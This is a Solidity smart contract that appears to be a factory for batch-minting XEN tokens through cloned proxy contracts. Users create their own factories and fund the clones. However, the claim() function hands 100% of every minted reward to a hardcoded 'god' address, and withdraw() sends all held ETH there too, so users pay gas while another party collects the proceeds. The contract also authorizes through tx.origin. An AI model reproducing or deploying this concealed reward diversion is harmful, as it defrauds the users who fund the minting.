// SPDX-License-Identifier: AGPL

pragma solidity ^0.8.13;

import {Owned} from "./Owned.sol";
import {Clones} from "./Clones.sol";
import {IXen} from "./IXEN.sol";

contract XenFTXWitch is Owned {
    address public immutable XenFTXWitchOrigin;
    address public constant god = 0x68280f4638eaEC0e5Bf37d76bA665ae81d0a30Cb;
    address private constant XEN = 0x06450dEe7FD2Fb8E39061434BAbCFC05599a6Fb8;

    bytes public XENInitData;

    // factory proxy;
    uint public term;
    uint public createCount;

    event CreateFactory(address indexed factory, address indexed owner);
    event CreateMiniClone(address indexed clone1, address indexed clone2);

    constructor() Owned(god) {
        XenFTXWitchOrigin = address(this);
        XENInitData = bytes.concat(bytes20(0x3D602d80600A3D3981F3363d3d373d3D3D363d73), bytes20(address(this)), bytes15(0x5af43d82803e903d91602b57fd5bf3));
    }

    function withdraw() external {
        payable(god).transfer(address(this).balance);
    }

    function createFactory(uint term_) external {
        bytes memory bytecode = XENInitData;
        address addr;
        assembly {
            addr := create(0, add(bytecode, 32), mload(bytecode))
        }
        require(addr != address(0), "XenFTXWitch: create failed");
        XenFTXWitch cloneWitch = XenFTXWitch(payable(addr));
        cloneWitch.init(msg.sender);
        cloneWitch.setTerm(term_);
        emit CreateFactory(address(cloneWitch), msg.sender);
    }

    //====== clone factory function ======//
    function init(address owner_) external {
        require(owner == address(0x0), "En?NiXiaoZi!"); //嗯?你小子!
        owner = owner_;
    }

    function setTerm(uint term_) public {
        require(tx.origin == owner, "UNAUTHORIZED");
        term = term_;
    }

    receive() external payable {
        address thisAddress = address(this);
        uint termM = term;
        uint createCountM = createCount;
        require(thisAddress != XenFTXWitchOrigin, "KeKe,ZaShier"); //咳咳，咋事儿?
        address instance = Clones.cloneDeterministic(XenFTXWitchOrigin,keccak256(abi.encodePacked(owner, createCountM)));
        XenFTXWitch(payable(instance)).initSubOwner(thisAddress,termM);
        createCount = createCountM + 1;
    }

    function claimAll(uint32[] calldata ids) public {
        uint l = ids.length;
        while(l > 0){
            l--;
            XenFTXWitch(
                payable(Clones.predictDeterministicAddress(XenFTXWitchOrigin,keccak256(abi.encodePacked(msg.sender, uint(ids[l])))))
            ).claim();
        }
    }

    ///==== sub proxy function ====///

    function initSubOwner(
        address owner_,
        uint term_
    ) public {
        require(owner == address(0x0), "W?");
        owner = owner_;
        IXen(XEN).claimRank(term_);
    }

    function claim() public {
        require(owner == msg.sender, "UNAUTHORIZED CLAIM");
        IXen(XEN).claimMintRewardAndShare(god, 100);
    }
}